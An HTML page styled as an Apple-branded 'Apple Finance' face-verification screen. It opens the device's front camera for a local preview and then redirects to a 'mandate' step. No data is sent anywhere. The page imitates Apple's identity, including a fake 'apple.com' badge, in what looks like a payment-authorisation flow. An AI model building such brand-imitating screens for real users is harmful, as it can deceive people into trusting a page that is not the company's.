<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Apple Finance - Face Verification</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: #E9EBF0;
      min-height: 100dvh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
      color: #1D1D1F;
    }
    .mobile-screen {
      width: 402px;
      height: 800px;
      background: #fff;
      border-radius: 24px;
      overflow: hidden;
      box-shadow: 0 18px 48px rgba(0,0,0,0.18);
      display: flex;
      flex-direction: column;
    }
    .main { flex: 1; padding: 24px 20px 16px; display: flex; flex-direction: column; }
    h1 { font-size: 22px; line-height: 28px; letter-spacing: -0.26px; margin-bottom: 8px; }
    .sub { font-size: 15px; line-height: 20px; letter-spacing: -0.23px; color: #6E6E73; margin-bottom: 20px; }

    .man-wrap {
      border: 1px solid #d3d5da;
      border-radius: 18px;
      padding: 14px;
      background: linear-gradient(180deg, #f8fbff 0%, #f3f6ff 100%);
      margin-bottom: 16px;
    }
    .man-illustration {
      height: 240px;
      border-radius: 14px;
      background:
        radial-gradient(circle at 50% 24%, #ffd7b8 0 20px, transparent 21px),
        radial-gradient(circle at 50% 22%, #2d2f35 0 28px, transparent 29px),
        linear-gradient(180deg, #6ba0ff 0 44%, #5b8be1 45% 100%);
      position: relative;
      overflow: hidden;
      display: flex;
      align-items: flex-end;
      justify-content: center;
    }
    .man-illustration::before {
      content: "";
      position: absolute;
      width: 140px;
      height: 150px;
      bottom: -10px;
      border-radius: 60% 60% 18% 18%;
      background: #79a8ff;
    }

    .video-wrap {
      margin-top: 12px;
      border-radius: 12px;
      overflow: hidden;
      border: 1px solid #d6d6da;
      display: none;
      position: relative;
      background: #000;
    }
    video {
      width: 100%;
      height: 220px;
      object-fit: cover;
      display: block;
    }

    .row { display: flex; gap: 10px; margin-top: auto; }
    .btn {
      flex: 1;
      border: none;
      border-radius: 12px;
      height: 52px;
      font-size: 17px;
      letter-spacing: -0.43px;
      cursor: pointer;
    }
    .btn-primary { background: #08f; color: #fff; }
    .btn-secondary { background: #f3f3f7; color: #1D1D1F; }
    .hint { margin-top: 10px; font-size: 13px; color: #86868B; line-height: 18px; }

    .apple-badge { display: flex; justify-content: center; padding: 14px 0 18px; }
    .apple-pill { background: #F5F5F7; border-radius: 999px; padding: 8px 20px; font-size: 15px; }

    @media (max-width: 460px) {
      body { padding: 0; background: #fff; }
      .mobile-screen { border-radius: 0; box-shadow: none; }
    }
  </style>
</head>
<body>
  <div class="mobile-screen">
    <main class="main">
      <h1>One quick verification</h1>
      <p class="sub">Please align your face in the frame to continue with your offer journey.</p>

      <div class="man-wrap">
        <div class="man-illustration"></div>
        <div id="videoWrap" class="video-wrap">
          <video id="cameraPreview" autoplay playsinline muted></video>
        </div>
      </div>

      <div class="hint" id="cameraHint">Tap "Open Camera" to start the device camera.</div>

      <div class="row">
        <button class="btn btn-secondary" onclick="window.history.back()">Back</button>
        <button id="openCameraBtn" class="btn btn-primary">Open Camera</button>
      </div>
      <div class="row" style="margin-top:10px;">
        <button id="continueBtn" class="btn btn-primary" disabled style="opacity:.45; cursor:not-allowed;">Continue to Mandate</button>
      </div>
    </main>
    <div class="apple-badge"><span class="apple-pill">apple.com</span></div>
  </div>

  <script>
    const openCameraBtn = document.getElementById('openCameraBtn');
    const continueBtn = document.getElementById('continueBtn');
    const cameraHint = document.getElementById('cameraHint');
    const videoWrap = document.getElementById('videoWrap');
    const cameraPreview = document.getElementById('cameraPreview');
    let mediaStream = null;

    async function openCamera() {
      try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        cameraPreview.srcObject = mediaStream;
        videoWrap.style.display = 'block';
        cameraHint.textContent = 'Camera active. Continue when ready.';
        continueBtn.disabled = false;
        continueBtn.style.opacity = '1';
        continueBtn.style.cursor = 'pointer';
      } catch (error) {
        cameraHint.textContent = 'Unable to access camera. Please allow camera permission and try again.';
      }
    }

    function stopCamera() {
      if (!mediaStream) return;
      mediaStream.getTracks().forEach(track => track.stop());
      mediaStream = null;
    }

    openCameraBtn.addEventListener('click', openCamera);
    continueBtn.addEventListener('click', () => {
      if (continueBtn.disabled) return;
      stopCamera();
      window.location.href = '/initiating-mandate';
    });

    window.addEventListener('beforeunload', stopCamera);
  </script>
</body>
</html>
